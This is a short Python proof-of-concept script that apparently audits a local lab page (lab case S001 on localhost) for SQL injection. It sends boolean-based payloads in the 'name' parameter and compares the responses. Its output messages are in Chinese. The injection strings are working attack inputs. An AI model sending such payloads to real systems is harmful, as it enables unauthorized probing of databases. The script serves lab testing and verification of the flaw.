#!/usr/bin/env python3
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"

def fetch(name):
    query = urllib.parse.urlencode({"name": name})
    url = BASE + "?" + query
    req = urllib.request.Request(url, headers={"User-Agent": "S001-audit-poc"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body

def main():
    normal_status, normal_body = fetch("Alice")
    true_status, true_body = fetch("Alice' AND '1'='1")
    false_status, false_body = fetch("Alice' AND '1'='2")

    print("normal status:", normal_status)
    print("true-test status:", true_status)
    print("false-test status:", false_status)

    normal_has_alice = "Alice" in normal_body
    true_has_alice = "Alice" in true_body
    false_has_alice = "Alice" in false_body

    print("normal contains Alice:", normal_has_alice)
    print("true-test contains Alice:", true_has_alice)
    print("false-test contains Alice:", false_has_alice)

    if normal_has_alice and true_has_alice and not false_has_alice:
        print("观察符合：注入输入改变了 SQL 条件，普通/真条件返回 Alice，假条件未返回 Alice。")
    else:
        print("未观察到预期差异；请检查入口 URL、db_connect.php、MariaDB 服务和 lab_people 预置数据。")

if __name__ == "__main__":
    main()
